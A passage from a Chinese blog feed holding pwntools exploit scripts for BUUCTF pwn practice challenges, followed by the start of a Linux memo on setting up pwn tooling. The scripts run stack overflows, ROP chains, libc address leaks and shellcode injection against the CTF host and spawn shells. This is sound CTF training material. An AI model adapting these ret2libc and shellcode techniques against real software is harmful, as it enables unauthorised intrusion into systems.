plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>sysytem和/bin/sh都有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class="line">bin_sh &#x3D; 0x0804A024</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class="line">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="not-the-same-3dsctf-2016（32位write调用）"><a href="#not-the-same-3dsctf-2016（32位write调用）" class="headerlink" title="not_the_same_3dsctf_2016（32位write调用）"></a>not_the_same_3dsctf_2016（32位write调用）</h2><p>把bss段上的flag直接通过write函数拿出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class="line">bss&#x3D;0x080eca2d</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class="line">#print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>主要来熟悉一下这个东西</p><p>one_gadget</p><p>有libc基址直接就可以上one_gadget</p><blockquote><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">ru(&quot;here is the gift for u:&quot;)</span><br><span class="line">printf &#x3D; int(ru(&#39;\n&#39;)[2:],16)</span><br><span class="line"></span><br><span class="line">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class="line">one_gadget &#x3D; 0x106ef8</span><br><span class="line">leak(&quot;printf&quot;,libcbase)</span><br><span class="line">sys &#x3D; libcbase + one_gadget</span><br><span class="line">payload &#x3D; str(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sl(32)</span><br><span class="line">sys &#x3D; 0x4006E6</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x400490</span><br><span class="line">bin_sh &#x3D; 0x601048</span><br><span class="line">pop_rdi &#x3D; 0x400683</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x4004C0</span><br><span class="line">bin_sh &#x3D; 0x600A90</span><br><span class="line">pop_rdi &#x3D; 0x4006b3</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><blockquote><p>写shellcode要注意不同架构下</p><p>shellcode是不同的</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; 0x4004c9</span><br><span class="line">bss &#x3D; 0x601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">sla(&quot;tell me your name\n&quot;,shellcode)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class="line">sla(&quot;me?\n&quot;,payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><blockquote><p>32位puts泄露</p><p>但好像put的got表不可以泄露</p><p>需要试一试其他的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29708</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(log)</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Please input new log info:"</span>)</span><br><span class="line">    sl(log)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn14"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">main = <span class="number">0x8048722</span></span><br><span class="line">sys = <span class="number">0x80484D0</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">printf = uu32(r(<span class="number">4</span>))</span><br><span class="line">print(printf)</span><br><span class="line">libc = LibcSearcher(<span class="string">"printf"</span>,printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">"printf"</span>)</span><br><span class="line">leak(<span class="string">"printf"</span>,libc_base)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="铁人三项-第五赛区-2018-rop-32位write泄露"><a href="#铁人三项-第五赛区-2018-rop-32位write泄露" class="headerlink" title="铁人三项(第五赛区)_2018_rop(32位write泄露)"></a>铁人三项(第五赛区)_2018_rop(32位write泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27242</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn15"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484C6</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">leak(<span class="string">"write"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop-64位puts泄露"><a href="#bjdctf-2020-babyrop-64位puts泄露" class="headerlink" title="bjdctf_2020_babyrop(64位puts泄露)"></a>bjdctf_2020_babyrop(64位puts泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27648</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn17"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4006AD</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">"Pull up your sword and tell me u story!\n"</span>,payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\n'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">leak(<span class="string">"puts"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>连上就有</p><h2 id="pwn2-sctf-2016（32位printf泄露）"><a href="#pwn2-sctf-2016（32位printf泄露）" class="headerlink" title="pwn2_sctf_2016（32位printf泄露）"></a>pwn2_sctf_2016（32位printf泄露）</h2><blockquote><p>好像prinf的got表打不通</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28222</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn19"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib32/libc.so.6")</span></span><br><span class="line">vuln = <span class="number">0x804852F</span></span><br><span class="line">formats = <span class="number">0x80486A8</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"atoi"</span>,atoi)</span><br><span class="line">libc_base = atoi - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(sys) +p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop2-64位printf泄露"><a href="#HarekazeCTF2019-baby-rop2-64位printf泄露" class="headerlink" title="[HarekazeCTF2019]baby_rop2(64位printf泄露)"></a>[HarekazeCTF2019]baby_rop2(64位printf泄露)</h2><blockquote><p>经常会出现泄露printf的got表不行的情况</p><p>尽量用其他的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28714</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn21"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">vuln = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">read = uu64(ru(<span class="string">"What's"</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,read)</span><br><span class="line">libc_base = read - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28640</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn22"</span>)</span><br><span class="line">ru(<span class="string">"Yippie, lets crash: "</span>)</span><br><span class="line">stack = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(stack)</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">"crashme\x00"</span>  + <span class="string">b'A'</span>*(<span class="number">0x16</span><span class="number">-8</span>+<span class="number">4</span>) + p32(stack<span class="number">-0x1c</span>) + shellcode</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;寒假开始刷题&lt;/p&gt;
&lt;h1 id=&quot;BUU（栈）&quot;&gt;&lt;a href=&quot;#BUU（栈）&quot; class=&quot;headerlink&quot; title=&quot;BUU（栈）&quot;&gt;&lt;/a&gt;BUU（栈）&lt;/h1&gt;&lt;h2 id=&quot;warmup-csaw-2016&quot;&gt;&lt;a href=&quot;#warmup-</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>linux备忘录</title>
    <link href="https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2021-01-23T06:22:17.000Z</published>
    <updated>2021-02-21T06:28:22.644Z</updated>
    
    <content type="html"><![CDATA[<p>主要记录一些基础的linux知识</p><h1 id="0x01-安装PWN环境"><a href="#0x01-安装PWN环境" class="headerlink" title="0x01 安装PWN环境"></a>0x01 安装PWN环境</h1><p>这里主要记录一下从0开始安装pwn环境</p><h2 id="1-vmtools"><a href="#1-vmtools" class="headerlink" title="1.vmtools"></a>1.vmtools</h2><p>先挂载上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxpf VMwareTools-x.x.x-yyyy.tar.gz</span><br><span class="line">cd vmware-tools-distrib</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure><p>安装先输YES</p><p>之后直接回车</p><h2 id="2-安装git"><a href="#2-安装git" class="headerlink" title="2.安装git"></a>2.安装git</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h2 id="3-安装pip"><a href="#3-安装pip" class="headerlink" title="3.安装pip"></a>3.安装pip</h2><p>pip2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><p>pip3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h2 id="4-安装vim"><a href="#4-安装vim" class="headerlink" title="4.安装vim"></a>4.安装vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove vim-common</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><h2 id="5-安装pwntools"><a href="#5-安装pwntools" class="headerlink" title="5.安装pwntools"></a>5.安装pwntools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="6-安装libcSearcher"><a href="#6-安装libcSearcher" class="headerlink" title="6.安装libcSearcher"></a>6.安装libcSearcher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">sudo python setup.py install</span><br><span class="line">把LibcSearcher.py放在exp相同目录下运行exp.py即可</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先安装libc库</span><br><span class="line">exp片段：</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf&#x3D;ELF(&#39;libc.xx.xx&#39;)</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">sys_addr &#x3D; offset + libc.dump(&#39;system&#39;)</span><br></pre></td></tr></table></figure><h2 id="7-安装One-gadget"><a href="#7-安装One-gadget" class="headerlink" title="7.安装One_gadget"></a>7.安装One_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="8-安装pwndbg"><a href="#8-安装pwndbg" class="headerlink" title="8.安装pwndbg"></a>8.安装pwndbg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure><h2 id="9-安装ssh"><a href="#9-安装ssh" class="headerlink" title="9.安装ssh"></a>9.安装ssh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">&#x2F;&#x2F;开启服务</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure><p><strong>配置文件/etc/ssh/sshd_config</strong></p><h2 id="10-安装conda"><a href="#10-安装conda" class="headerlink" title="10.安装conda"></a>10.安装conda</h2><p>conda是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 